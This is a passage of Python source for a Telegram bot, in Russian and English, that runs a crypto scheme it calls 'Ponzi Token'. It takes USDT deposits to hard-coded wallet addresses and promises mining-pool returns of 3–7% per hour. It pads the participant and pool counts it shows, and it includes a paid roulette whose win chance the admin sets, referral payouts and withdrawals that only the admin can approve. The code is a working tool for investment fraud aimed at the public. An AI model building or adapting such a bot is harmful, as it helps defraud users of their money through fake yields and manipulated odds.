import asyncio
import json
import logging
import os
import random
import sqlite3
from pathlib import Path
import time
from datetime import datetime, timedelta
from dataclasses import dataclass
from typing import Optional
from zoneinfo import ZoneInfo

try:
    from zoneinfo import ZoneInfoNotFoundError
except ImportError:
    class ZoneInfoNotFoundError(Exception):
        pass

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, WebAppInfo
from telegram.error import BadRequest
from telegram.helpers import escape_markdown
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)


logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger(__name__)

ADMIN_ID = 8244378173
DB_PATH = os.environ.get("BOT_DB_PATH", "bot_data.sqlite3")
def load_bot_token() -> str:
    token_file = os.environ.get("BOT_TOKEN_FILE", "").strip()
    if token_file:
        try:
            return Path(token_file).read_text(encoding="utf-8").strip()
        except OSError:
            return ""
    return os.environ.get("BOT_TOKEN", "").strip()


BOT_TOKEN = load_bot_token()
BASE_PARTICIPANTS = 5349
BASE_OPEN_POOLS = 1837
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://testcomingsoon.ru/")
ROULETTE_DEFAULT_WIN_CHANCE = 65
ROULETTE_SPIN_COST = 3.0
ROULETTE_PRIZES = [
    {"type": "usdt", "label": "4$", "amount": 4.0, "weight": 11},
    {"type": "usdt", "label": "5$", "amount": 5.0, "weight": 10},
    {"type": "usdt", "label": "2$", "amount": 2.0, "weight": 10},
    {"type": "usdt", "label": "7$", "amount": 7.0, "weight": 9},
    {"type": "usdt", "label": "10$", "amount": 10.0, "weight": 8},
    {"type": "usdt", "label": "15$", "amount": 15.0, "weight": 7},
    {"type": "usdt", "label": "20$", "amount": 20.0, "weight": 6},
    {"type": "usdt", "label": "25$", "amount": 25.0, "weight": 5},
    {"type": "usdt", "label": "50$", "amount": 50.0, "weight": 4},
    {"type": "usdt", "label": "200$", "amount": 200.0, "weight": 2},
    {"type": "usdt", "label": "250$", "amount": 250.0, "weight": 2},
    {"type": "usdt", "label": "300$", "amount": 300.0, "weight": 2},
    {"type": "usdt", "label": "500$", "amount": 500.0, "weight": 1},
    {"type": "usdt", "label": "600$", "amount": 600.0, "weight": 1},
    {"type": "usdt", "label": "1000$", "amount": 1000.0, "weight": 1},
    {"type": "token", "label": "5.000 токенов", "tokens": 5000, "weight": 6},
    {"type": "token", "label": "10.000 токенов", "tokens": 10000, "weight": 5},
    {"type": "token", "label": "15.000 токенов", "tokens": 15000, "weight": 4},
    {"type": "boost", "label": "Буст +3% 24ч", "hours": 24, "weight": 7},
]

ROULETTE_ZERO_CHANCE_POOL = [
    {"type": "usdt", "label": "1$", "amount": 1.0},
    {"type": "usdt", "label": "2$", "amount": 2.0},
    {"type": "usdt", "label": "3$", "amount": 3.0},
    {"type": "token", "label": "10.000 токенов", "tokens": 10000},
    {"type": "token", "label": "15.000 токенов", "tokens": 15000},
    {"type": "token", "label": "5.000 токенов", "tokens": 5000},
    {"type": "nothing", "label": "Ничего не выйграно"},
]

POOL_CONFIG = {
    1: {"min": 0, "max": 30, "rate": 0.03, "label": "1 Pool — до 30$, 3% за час", "cost": 30},
    2: {"min": 31, "max": 250, "rate": 0.07, "label": "2 Pool — от 31$ до 250$, 7% за час", "cost": 31},
}

NETWORK_ADDRESSES = {
    "solana": "2iQtKz2bWoRTGJ669FUr8ANW6j1YQK7SYQXMSmkuGe9k",
    "trc20": "TCAgFkP2bo2KzvePPbGnQE9jVAaoGgtr2U",
    "bep20": "0x724cbc5f8f7eBcBce702D7957dC10340d9055fBD",
}

I18N = {
    "ru": {
        "choose_lang": "🌐 Выберите язык / Choose language",
        "bonus_new_user": "🎁 Новый пользователь зарегистрирован. Бонус: +5$ к балансу.",
        "waiting": (
            "*📌 Главное меню*\n"
            "👥 *Кол-во участников:* {participants_total}\n"
            "⛏ *Кол-во открытых пулов:* {global_pools_total}\n"
            "───────\n"
            "👤 *Ваш ID:* `{user_id}`\n"
            "📊 *Сколько пулов открыто:* {open_pools}\n"
            "📈 *Ваш % с пула:* {pool_percent}\n"
            "💵 *Заработано:* {earned}\n"
            "───────\n\n"
            "*⏳ Ожидаем*\n"
            "📱 WebApp — 04.03.2026\n"
            "🎮 Игра (Ферма) — 04.03.2026\n"
            "🤝 Коллаборации — 04.03.2026\n"
            "🚀 TGE Ponzi Token — 05.03.2026\n"
            "Ожидайте новостей..."
        ),
        "menu_mining": "⛏ Майнинг",
        "menu_profile": "👤 Профиль",
        "menu_about": "ℹ️ О Нас",
        "menu_refresh": "🔄 Обновить",
        "menu_boost": "🚀 Boost",
        "boost_text": "*🚀 Boost для фермы*\n───────\n\nВы можете активировать Boost для Вашей фермы.\n\n🔹 Pool 1: +3% на 12 часов (стоимость 4$)\n🔹 Pool 2: +3% на 6 часов (стоимость 30$)",
        "boost_buy_1": "💳 Для активации Boost Pool1 требуется 4$.",
        "boost_buy_2": "💳 Для активации Boost Pool2 требуется 30$.",
        "boost_ok": "✅ Boost активирован: +3% на {hours}ч.",
        "boost_insufficient": "❌ Недостаточно баланса для покупки Boost.",
        "boost_already": "⚠️ Для этого пула Boost уже был активирован.",
        "boost_need_pool": "⚠️ Сначала откройте пул, затем активируйте Boost.",
        "mining_text": "*⛏ Майнинг*\n───────\n\n📈 *Доступные пулы:*\n1 Pool — вклад 0 - 30$, 3% за час\n2 Pool — вклад 31 - 250$, 7% за час\n\n⚡ Начисления происходят в режиме онлайн (обновление каждые 30 сек).\n🔓 Пул можно закрыть в любой момент.\n♾ Срок действия пула безграничный.",
        "pool_ok": "✅ Пул {pool} запущен на сумму {amount}. Начисления активированы.",
        "pool_fail": "❌ Недостаточно баланса для запуска пула {pool}.",
        "pool_already_opened": "⚠️ Вы уже открыли пул. Сначала закройте текущий.",
        "close_pool_btn": "🛑 Закрыть Пул",
        "pool_closed": "✅ Пул закрыт. Чистая прибыль: {earned}. Время фарма: {duration}.",
        "pool_no_active": "⚠️ У вас нет активного пула.",
        "profile": (
            "*👤 Профиль*\n"
            "───────\n\n"
            "*Ваш User Id:* `{user_id}`\n"
            "*Ваш Баланс:* *{balance:.2f}$*\n"
            "*Открыто Пулов:* *{open_pools}*\n"
            "*Ваша Реферальная Ссылка:*\n{ref_link}\n"
            "*Кол-во рефералов:* *{ref_count}*\n\n"
            "💸 Вы получаете 15% от доходов вашего реферала\n"
            "➖ Вывод доступен от 10$"
        ),
        "about": "*ℹ️ О нас*\n───────\n\n🚀 *Ponzi Token Team*\nМы крупная команда по Ponzi Token.\n🕶 Ты ничего о нас не знаешь, но ты уже сталкивался с нами.\n\n👤 *Manager:* @Ezarma\\_aa",
        "deposit_select_network": "*💳 Пополнение*\n───────\n\nВыберите сеть для пополнения:",
        "ask_deposit_amount": "Введите сумму пополнения в USDT (например, 50):",
        "thinking": "🤖 Бот думает...",
        "deposit_address": "*📥 Реквизиты пополнения*\n───────\n\nСеть: *{network}*\nАдрес:\n`{address}`\n\nСумма к пополнению: *{amount}*\nСтатус: ⏳ Ожидает пополнения",
        "deposit_refresh": "🔄 Статус: заявка на пополнение ещё на проверке админом.",
        "withdraw_ask_address": "Введите адрес кошелька USDT TRC20 для вывода:",
        "withdraw_ask_amount": "Введите сумму вывода в USDT:",
        "withdraw_low_balance": "❌ Недостаточно средств для вывода.",
        "withdraw_min_10": "⚠️ Вывод доступен от 10$.",
        "withdraw_gift_locked": "⚠️ Подарочные 5$ нельзя вывести сразу. Нужно: пополнить от 10$ или намайнить x2 от подарка (10$).",
        "withdraw_submitted": "✅ Заявка на вывод отправлена на проверку администратору.",
        "profile_language_btn": "🌐 Сменить язык",
        "profile_language_title": "Выберите язык интерфейса:",
        "pool_amount_prompt": "Введите сумму для открытия пула в USDT:",
        "pool_amount_bad": "Введите корректную сумму.",
        "antiflood_wait": "⏳ Слишком часто. Подождите {seconds} сек.",
        "rs_prompt": "✉️ Отправьте текст для рассылки.",
        "rs_report": "✅ Рассылка завершена. Доставлено: {ok}. Ошибок: {fail}.",
        "back_to_menu": "🔙 Возврат в главное меню...",
        "approved_deposit": "✅ Пополнение одобрено. Баланс увеличен на {amount:.2f}$.",
        "rejected_deposit": "❌ Пополнение отклонено администратором.",
        "approved_withdraw": "✅ Вывод одобрен. Списано {amount:.2f}$.",
        "rejected_withdraw": "❌ Вывод отклонён администратором.",
        "new_referral": "🎉 У вас новый реферал: {ref_user}",
        "ref_bonus": "💸 Реферальный бонус +{amount} от дохода реферала.",
        "roulette_insufficient": "❌ Недостаточно баланса для рулетки. Нужно 3$.",
        "roulette_spin_paid": "🎰 Списано 3$ за прокрут рулетки.",
        "roulette_win_usdt": "💸 Выпало *{amount:.2f}$ USDT*! Приз уже зачислен на баланс.",
        "roulette_win_boost": "🚀 Выпал Boost: +3% на 12 часов для активного пула!",
        "roulette_boost_fallback": "🎁 Выпал Boost, но активного пула нет или Boost уже был на этом пуле. Начислена компенсация *{amount:.2f}$*.",
        "roulette_result_title": "🎉 *Результат рулетки*",
        "roulette_unknown_action": "⚠️ Неизвестное действие WebApp.",
        "roulette_nothing": "😶 Ничего не выйграно.",
        "roulette_boost_saved": "🎁 Boost +3% на 24ч сохранён во вкладке призов. Активируйте, когда захотите.",
        "roulette_token_win": "🪙 Вы выиграли {tokens} токенов Ponzi Token.",
        "roulette_win_chance_set": "✅ Шанс победы в рулетке установлен: {value}%.",
        "roulette_admin_panel": "⚙️ Панель рулетки админа. Текущий шанс победы: {value}%.",
        "maintenance": "🛠 Бот на технических работах с 08:00 - 09:00 (UTC).",
    },
    "en": {
        "choose_lang": "🌐 Choose language / Выберите язык",
        "bonus_new_user": "🎁 New user registered. Bonus: +$5 balance.",
        "waiting": (
            "*📌 Main menu*\n"
            "👥 *Participants:* {participants_total}\n"
            "⛏ *Opened pools:* {global_pools_total}\n"
            "───────\n"
            "👤 *Your ID:* `{user_id}`\n"
            "📊 *Open pools:* {open_pools}\n"
            "📈 *Your pool %:* {pool_percent}\n"
            "💵 *Earned:* {earned}\n"
            "───────\n\n"
            "*⏳ Waiting*\n"
            "📱 WebApp — 04.03.2026\n"
            "🎮 Game (Farm) — 04.03.2026\n"
            "🤝 Collaborations — 04.03.2026\n"
            "🚀 TGE Ponzi Token — 05.03.2026\n"
            "Wait for updates..."
        ),
        "menu_mining": "⛏ Mining",
        "menu_profile": "👤 Profile",
        "menu_about": "ℹ️ About us",
        "menu_refresh": "🔄 Refresh",
        "menu_boost": "🚀 Boost",
        "boost_text": "*🚀 Boost for your farm*\n───────\n\nYou can activate Boost for your farm.\n\n🔹 Pool 1: +3% for 12 hours (cost 4$)\n🔹 Pool 2: +3% for 6 hours (cost 30$)",
        "boost_buy_1": "💳 Boost Pool1 activation costs 4$.",
        "boost_buy_2": "💳 Boost Pool2 activation costs 30$.",
        "boost_ok": "✅ Boost activated: +3% for {hours}h.",
        "boost_insufficient": "❌ Not enough balance to buy Boost.",
        "boost_already": "⚠️ Boost has already been activated for this pool.",
        "boost_need_pool": "⚠️ Open a pool first, then activate Boost.",
        "mining_text": "*⛏ Mining*\n───────\n\n📈 *Available pools:*\n1 Pool — deposit 0 - 30$, 3% per hour\n2 Pool — deposit 31 - 250$, 7% per hour\n\n⚡ Accruals run online (updated every 30 sec).\n🔓 Pool can be closed anytime.\n♾ Pool lifetime is unlimited.",
        "pool_ok": "✅ Pool {pool} started with amount {amount}. Accruals activated.",
        "pool_fail": "❌ Not enough balance to start pool {pool}.",
        "pool_already_opened": "⚠️ You already have an open pool. Close it first.",
        "close_pool_btn": "🛑 Close Pool",
        "pool_closed": "✅ Pool closed. Net profit: {earned}. Farming time: {duration}.",
        "pool_no_active": "⚠️ You have no active pool.",
        "profile": (
            "*👤 Profile*\n"
            "───────\n\n"
            "*Your User Id:* `{user_id}`\n"
            "*Your Balance:* *{balance:.2f}$*\n"
            "*Open Pools:* *{open_pools}*\n"
            "*Your Referral Link:*\n{ref_link}\n"
            "*Referrals count:* *{ref_count}*\n\n"
            "💸 You get 15% of your referral's earnings\n"
            "➖ Withdrawal is available from $10"
        ),
        "about": "*ℹ️ About us*\n───────\n\n🚀 *Ponzi Token Team*\nWe are a major Ponzi Token team.\n🕶 You know nothing about us, but you have already encountered us.\n\n👤 *Manager:* @Ezarma\\_aa",
        "deposit_select_network": "*💳 Deposit*\n───────\n\nSelect a network for deposit:",
        "ask_deposit_amount": "Enter deposit amount in USDT (e.g. 50):",
        "thinking": "🤖 Bot is thinking...",
        "deposit_address": "*📥 Deposit details*\n───────\n\nNetwork: *{network}*\nAddress:\n`{address}`\n\nExpected deposit amount: *{amount}*\nStatus: ⏳ Waiting for deposit",
        "deposit_refresh": "🔄 Status: deposit request is still under admin review.",
        "withdraw_ask_address": "Enter your USDT TRC20 wallet address for withdrawal:",
        "withdraw_ask_amount": "Enter withdrawal amount in USDT:",
        "withdraw_low_balance": "❌ Insufficient balance for withdrawal.",
        "withdraw_min_10": "⚠️ Withdrawal is available from $10.",
        "withdraw_gift_locked": "⚠️ Gift $5 can't be withdrawn immediately. You need: own deposit >= $10 or mine x2 of the gift ($10).",
        "withdraw_submitted": "✅ Withdrawal request sent to admin for confirmation.",
        "profile_language_btn": "🌐 Change language",
        "profile_language_title": "Choose interface language:",
        "pool_amount_prompt": "Enter amount to open pool in USDT:",
        "pool_amount_bad": "Enter a valid amount.",
        "antiflood_wait": "⏳ Too many actions. Wait {seconds} sec.",
        "rs_prompt": "✉️ Send broadcast text.",
        "rs_report": "✅ Broadcast completed. Delivered: {ok}. Failed: {fail}.",
        "back_to_menu": "🔙 Returning to main menu...",
        "approved_deposit": "✅ Deposit approved. Balance increased by {amount:.2f}$.",
        "rejected_deposit": "❌ Deposit rejected by admin.",
        "approved_withdraw": "✅ Withdrawal approved. {amount:.2f}$ has been deducted.",
        "rejected_withdraw": "❌ Withdrawal rejected by admin.",
        "new_referral": "🎉 You have a new referral: {ref_user}",
        "ref_bonus": "💸 Referral bonus +{amount} from your referral earnings.",
        "roulette_insufficient": "❌ Not enough balance for roulette. You need $3.",
        "roulette_spin_paid": "🎰 $3 charged for roulette spin.",
        "roulette_win_usdt": "💸 You won *${amount:.2f} USDT*! Prize has been credited.",
        "roulette_win_boost": "🚀 You won Boost: +3% for 12 hours for your active pool!",
        "roulette_boost_fallback": "🎁 Boost dropped, but you have no active pool (or boost already used for this pool). Compensation *${amount:.2f}* credited.",
        "roulette_result_title": "🎉 *Roulette result*",
        "roulette_unknown_action": "⚠️ Unknown WebApp action.",
        "roulette_nothing": "😶 Nothing won.",
        "roulette_boost_saved": "🎁 Boost +3% for 24h was saved in your prizes tab. Activate it anytime.",
        "roulette_token_win": "🪙 You won {tokens} Ponzi Tokens.",
        "roulette_win_chance_set": "✅ Roulette win chance set to: {value}%.",
        "roulette_admin_panel": "⚙️ Admin roulette panel. Current global win chance: {value}%.",
        "maintenance": "🛠 Bot is under maintenance from 08:00 - 09:00 (UTC).",
    },
}


@dataclass
class UserState:
    mode: Optional[str] = None
    network: Optional[str] = None
    wallet: Optional[str] = None
    pool_number: Optional[int] = None


def db() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def moscow_now_ts() -> int:
    try:
        return int(datetime.now(ZoneInfo("Europe/Moscow")).timestamp())
    except (ZoneInfoNotFoundError, ModuleNotFoundError, ValueError):
        # Fallback for environments without tzdata (e.g. some Windows setups)
        return int((datetime.utcnow() + timedelta(hours=3)).timestamp())


def init_db() -> None:
    conn = db()
    cur = conn.cursor()
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
          user_id INTEGER PRIMARY KEY,
          lang TEXT DEFAULT 'ru',
          balance REAL DEFAULT 0,
          referrer_id INTEGER,
          pools_opened INTEGER DEFAULT 0,
          created_at INTEGER
        )
        """
    )
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS user_pools (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id INTEGER,
          pool_number INTEGER,
          started_at INTEGER,
          active INTEGER DEFAULT 1
        )
        """
    )
    columns = {row[1] for row in cur.execute("PRAGMA table_info(user_pools)").fetchall()}
    if "invested_amount" not in columns:
        cur.execute("ALTER TABLE user_pools ADD COLUMN invested_amount REAL DEFAULT 0")
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS transactions (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id INTEGER,
          tx_type TEXT,
          network TEXT,
          wallet TEXT,
          amount REAL,
          status TEXT,
          created_at INTEGER,
          admin_note TEXT
        )
        """
    )
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS boosts (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id INTEGER,
          pool_id INTEGER,
          boost_type INTEGER,
          bonus_rate REAL,
          cost REAL,
          started_at INTEGER,
          expires_at INTEGER
        )
        """
    )
    boost_columns = {row[1] for row in cur.execute("PRAGMA table_info(boosts)").fetchall()}
    if "pool_id" not in boost_columns:
        cur.execute("ALTER TABLE boosts ADD COLUMN pool_id INTEGER")

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS roulette_settings (
          key TEXT PRIMARY KEY,
          value TEXT
        )
        """
    )
    cur.execute(
        "INSERT OR IGNORE INTO roulette_settings(key, value) VALUES ('win_chance', ?)",
        (str(ROULETTE_DEFAULT_WIN_CHANCE),),
    )
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS roulette_wins (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id INTEGER,
          prize_type TEXT,
          prize_label TEXT,
          amount_usdt REAL DEFAULT 0,
          token_amount INTEGER DEFAULT 0,
          boost_hours INTEGER DEFAULT 0,
          status TEXT DEFAULT 'awarded',
          created_at INTEGER
        )
        """
    )
    conn.commit()
    conn.close()


def ensure_user(user_id: int, referrer_id: Optional[int] = None) -> bool:
    conn = db()
    cur = conn.cursor()
    cur.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    created = False
    if not cur.fetchone():
        cur.execute(
            "INSERT INTO users(user_id, referrer_id, balance, created_at) VALUES (?, ?, 5.0, ?)",
            (user_id, referrer_id, moscow_now_ts()),
        )
        created = True
    conn.commit()
    conn.close()
    return created




def bind_referrer_if_missing(user_id: int, referrer_id: Optional[int]) -> bool:
    if not referrer_id or referrer_id == user_id:
        return False

    conn = db()
    cur = conn.cursor()
    row = cur.execute("SELECT referrer_id FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not row:
        conn.close()
        return False

    if row[0] is not None:
        conn.close()
        return False

    cur.execute("UPDATE users SET referrer_id=? WHERE user_id=?", (referrer_id, user_id))
    conn.commit()
    conn.close()
    return True


def get_referrer_id(user_id: int) -> Optional[int]:
    conn = db()
    row = conn.execute("SELECT referrer_id FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    if not row:
        return None
    return row[0]


def get_all_user_ids() -> list[int]:
    conn = db()
    rows = conn.execute("SELECT user_id FROM users").fetchall()
    conn.close()
    return [int(r[0]) for r in rows]


def get_active_boost(user_id: int, pool_id: int, now_ts: Optional[int] = None) -> Optional[sqlite3.Row]:
    now_ts = now_ts or moscow_now_ts()
    conn = db()
    row = conn.execute(
        "SELECT * FROM boosts WHERE user_id=? AND pool_id=? AND expires_at>? ORDER BY expires_at DESC LIMIT 1",
        (user_id, pool_id, now_ts),
    ).fetchone()
    conn.close()
    return row


def buy_boost(user_id: int, boost_type: int) -> str:
    now_ts = moscow_now_ts()
    active_pool = get_active_pool(user_id)
    if not active_pool:
        return "no_pool"

    pool_id = int(active_pool["id"])

    conn = db()
    cur = conn.cursor()
    already = cur.execute("SELECT id FROM boosts WHERE user_id=? AND pool_id=? LIMIT 1", (user_id, pool_id)).fetchone()
    if already:
        conn.close()
        return "already"

    if boost_type == 1:
        cost, duration = 4.0, 12 * 3600
    else:
        cost, duration = 30.0, 6 * 3600

    user = cur.execute("SELECT balance FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user or float(user[0]) < cost:
        conn.close()
        return "insufficient"

    cur.execute("UPDATE users SET balance=balance-? WHERE user_id=?", (cost, user_id))
    cur.execute(
        "INSERT INTO boosts(user_id, pool_id, boost_type, bonus_rate, cost, started_at, expires_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (user_id, pool_id, boost_type, 0.03, cost, now_ts, now_ts + duration),
    )
    conn.commit()
    conn.close()
    return "ok"


def apply_free_boost_for_active_pool(user_id: int, hours: int = 12) -> bool:
    active_pool = get_active_pool(user_id)
    if not active_pool:
        return False

    pool_id = int(active_pool["id"])
    now_ts = moscow_now_ts()
    conn = db()
    cur = conn.cursor()
    already = cur.execute("SELECT id FROM boosts WHERE user_id=? AND pool_id=? LIMIT 1", (user_id, pool_id)).fetchone()
    if already:
        conn.close()
        return False

    cur.execute(
        "INSERT INTO boosts(user_id, pool_id, boost_type, bonus_rate, cost, started_at, expires_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (user_id, pool_id, 1, 0.03, 0.0, now_ts, now_ts + hours * 3600),
    )
    conn.commit()
    conn.close()
    return True


def get_roulette_win_chance() -> int:
    conn = db()
    row = conn.execute("SELECT value FROM roulette_settings WHERE key='win_chance'").fetchone()
    conn.close()
    try:
        return max(0, min(100, int(float(row[0])))) if row else ROULETTE_DEFAULT_WIN_CHANCE
    except (TypeError, ValueError):
        return ROULETTE_DEFAULT_WIN_CHANCE


def set_roulette_win_chance(value: int) -> int:
    value = max(0, min(100, int(value)))
    conn = db()
    conn.execute("INSERT INTO roulette_settings(key, value) VALUES ('win_chance', ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (str(value),))
    conn.commit()
    conn.close()
    return value


def list_recent_roulette_wins(user_id: int, limit: int = 20) -> list[dict]:
    conn = db()
    rows = conn.execute(
        "SELECT id, prize_type, prize_label, amount_usdt, token_amount, boost_hours, status, created_at FROM roulette_wins WHERE user_id=? ORDER BY id DESC LIMIT ?",
        (user_id, limit),
    ).fetchall()
    conn.close()
    return [dict(r) for r in rows]


def add_roulette_win(user_id: int, prize: dict, status: str = "awarded") -> int:
    now_ts = moscow_now_ts()
    conn = db()
    cur = conn.cursor()
    cur.execute(
        """
        INSERT INTO roulette_wins(user_id, prize_type, prize_label, amount_usdt, token_amount, boost_hours, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            user_id,
            prize.get("type", "nothing"),
            prize.get("label", "Nothing"),
            float(prize.get("amount", 0.0) or 0.0),
            int(prize.get("tokens", 0) or 0),
            int(prize.get("hours", 0) or 0),
            status,
            now_ts,
        ),
    )
    win_id = int(cur.lastrowid)
    conn.commit()
    conn.close()
    return win_id


def activate_boost_prize(user_id: int, win_id: int) -> dict:
    conn = db()
    row = conn.execute(
        "SELECT id, boost_hours, status FROM roulette_wins WHERE id=? AND user_id=? AND prize_type='boost' LIMIT 1",
        (win_id, user_id),
    ).fetchone()
    conn.close()
    if not row:
        return {"status": "not_found"}
    if row["status"] == "activated":
        return {"status": "already"}

    hours = int(row["boost_hours"] or 24)
    if not apply_free_boost_for_active_pool(user_id, hours=hours):
        return {"status": "no_pool"}

    conn = db()
    conn.execute("UPDATE roulette_wins SET status='activated' WHERE id=?", (win_id,))
    conn.commit()
    conn.close()
    return {"status": "ok", "hours": hours}


def spin_roulette(user_id: int) -> dict:
    user = get_user(user_id)
    if not user or float(user["balance"]) < ROULETTE_SPIN_COST:
        return {"status": "insufficient"}

    conn = db()
    conn.execute("UPDATE users SET balance=balance-? WHERE user_id=?", (ROULETTE_SPIN_COST, user_id))
    conn.commit()
    conn.close()

    win_chance = get_roulette_win_chance()
    if win_chance <= 0:
        prize = random.choice(ROULETTE_ZERO_CHANCE_POOL)
    elif random.random() >= (win_chance / 100.0):
        prize = {"type": "nothing", "label": "Ничего не выйграно"}
    else:
        weights = [int(p.get("weight", 1)) for p in ROULETTE_PRIZES]
        prize = random.choices(ROULETTE_PRIZES, weights=weights, k=1)[0]
    prize_type = prize.get("type")

    if prize_type == "nothing":
        win_id = add_roulette_win(user_id, prize, status="awarded")
        return {"status": "ok", "reward": "nothing", "spin_cost": ROULETTE_SPIN_COST, "win_id": win_id, "prize_label": prize.get("label", "Ничего не выйграно")}

    if prize_type == "usdt":
        amount = float(prize.get("amount", 0.0))
        conn = db()
        conn.execute("UPDATE users SET balance=balance+? WHERE user_id=?", (amount, user_id))
        conn.commit()
        conn.close()
        win_id = add_roulette_win(user_id, prize, status="credited")
        return {
            "status": "ok",
            "reward": "usdt",
            "amount": amount,
            "spin_cost": ROULETTE_SPIN_COST,
            "win_id": win_id,
            "prize_label": prize.get("label", "USDT"),
        }

    if prize_type == "token":
        tokens = int(prize.get("tokens", 0))
        win_id = add_roulette_win(user_id, prize, status="awarded")
        return {
            "status": "ok",
            "reward": "token",
            "tokens": tokens,
            "spin_cost": ROULETTE_SPIN_COST,
            "win_id": win_id,
            "prize_label": prize.get("label", "Token"),
        }

    hours = int(prize.get("hours", 24))
    win_id = add_roulette_win(user_id, prize, status="pending_activation")
    return {
        "status": "ok",
        "reward": "boost",
        "hours": hours,
        "spin_cost": ROULETTE_SPIN_COST,
        "win_id": win_id,
        "prize_label": prize.get("label", "Boost"),
    }


def get_boost_overlap_seconds(user_id: int, pool_id: int, start_ts: int, end_ts: int) -> int:
    if end_ts <= start_ts:
        return 0
    conn = db()
    rows = conn.execute(
        "SELECT started_at, expires_at FROM boosts WHERE user_id=? AND pool_id=? AND expires_at>? AND started_at<?",
        (user_id, pool_id, start_ts, end_ts),
    ).fetchall()
    conn.close()
    overlap = 0
    for r in rows:
        s = max(start_ts, int(r[0]))
        e = min(end_ts, int(r[1]))
        if e > s:
            overlap += e - s
    return overlap


def get_active_pool(user_id: int) -> Optional[sqlite3.Row]:
    conn = db()
    row = conn.execute(
        "SELECT id, pool_number, started_at, invested_amount FROM user_pools WHERE user_id=? AND active=1 ORDER BY started_at DESC LIMIT 1",
        (user_id,),
    ).fetchone()
    conn.close()
    return row


def pool_percent_and_earned(user_id: int) -> tuple[str, str]:
    pool = get_active_pool(user_id)
    if not pool:
        return "—", "—"

    pool_number = pool["pool_number"]
    started_at = int(pool["started_at"])
    base_rate = POOL_CONFIG.get(pool_number, {}).get("rate", 0)
    end_ts = moscow_now_ts()
    elapsed = max(0, end_ts - started_at)
    elapsed_bucket = (elapsed // 30) * 30
    end_bucket_ts = started_at + elapsed_bucket

    invested = float(pool["invested_amount"] or 0)
    invested = invested if invested > 0 else POOL_CONFIG.get(pool_number, {}).get("cost", 0)

    pool_id = int(pool["id"])
    boost_seconds = get_boost_overlap_seconds(user_id, pool_id, started_at, end_bucket_ts)
    earned = invested * (base_rate * (elapsed_bucket / 3600) + 0.03 * (boost_seconds / 3600))

    active_boost = get_active_boost(user_id, pool_id, end_ts)
    shown_rate = base_rate + (float(active_boost["bonus_rate"]) if active_boost else 0.0)
    return f"{int(shown_rate * 100)}%", f"{earned:.2f}$"


def close_active_pool(user_id: int) -> Optional[dict]:
    pool = get_active_pool(user_id)
    if not pool:
        return None

    pool_number = pool["pool_number"]
    started_at = int(pool["started_at"])
    base_rate = POOL_CONFIG.get(pool_number, {}).get("rate", 0)
    invested = float(pool["invested_amount"] or 0)
    invested = invested if invested > 0 else POOL_CONFIG.get(pool_number, {}).get("cost", 0)

    end_ts = moscow_now_ts()
    elapsed = max(0, end_ts - started_at)
    elapsed_bucket = (elapsed // 30) * 30
    end_bucket_ts = started_at + elapsed_bucket
    pool_id = int(pool["id"])
    boost_seconds = get_boost_overlap_seconds(user_id, pool_id, started_at, end_bucket_ts)
    earned = invested * (base_rate * (elapsed_bucket / 3600) + 0.03 * (boost_seconds / 3600))

    referrer_id = get_referrer_id(user_id)
    ref_bonus = earned * 0.15 if referrer_id else 0.0

    conn = db()
    cur = conn.cursor()
    cur.execute("UPDATE user_pools SET active=0 WHERE id=?", (pool["id"],))
    cur.execute("UPDATE users SET balance=balance+? WHERE user_id=?", (invested + earned, user_id))
    if referrer_id and ref_bonus > 0:
        cur.execute("UPDATE users SET balance=balance+? WHERE user_id=?", (ref_bonus, referrer_id))
    conn.commit()
    conn.close()

    return {
        "earned": earned,
        "seconds": elapsed_bucket,
        "pool_number": pool_number,
        "referrer_id": referrer_id,
        "ref_bonus": ref_bonus,
    }


def set_lang(user_id: int, lang: str) -> None:
    conn = db()
    conn.execute("UPDATE users SET lang=? WHERE user_id=?", (lang, user_id))
    conn.commit()
    conn.close()


def get_user(user_id: int) -> sqlite3.Row:
    conn = db()
    row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    return row


def get_lang(user_id: int) -> str:
    row = get_user(user_id)
    return row["lang"] if row and row["lang"] in I18N else "ru"


def get_ref_count(user_id: int) -> int:
    conn = db()
    value = conn.execute("SELECT COUNT(*) FROM users WHERE referrer_id=?", (user_id,)).fetchone()[0]
    conn.close()
    return value




def get_active_pools_count(user_id: int) -> int:
    conn = db()
    value = conn.execute("SELECT COUNT(*) FROM user_pools WHERE user_id=? AND active=1", (user_id,)).fetchone()[0]
    conn.close()
    return int(value or 0)


def get_total_users() -> int:
    conn = db()
    value = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    conn.close()
    return value


def get_total_opened_pools() -> int:
    conn = db()
    value = conn.execute("SELECT COUNT(*) FROM user_pools").fetchone()[0]
    conn.close()
    return value

def get_approved_deposit_total(user_id: int) -> float:
    conn = db()
    value = conn.execute(
        "SELECT COALESCE(SUM(amount), 0) FROM transactions WHERE user_id=? AND tx_type='deposit' AND status='approved'",
        (user_id,),
    ).fetchone()[0]
    conn.close()
    return float(value or 0)


def get_approved_withdraw_total(user_id: int) -> float:
    conn = db()
    value = conn.execute(
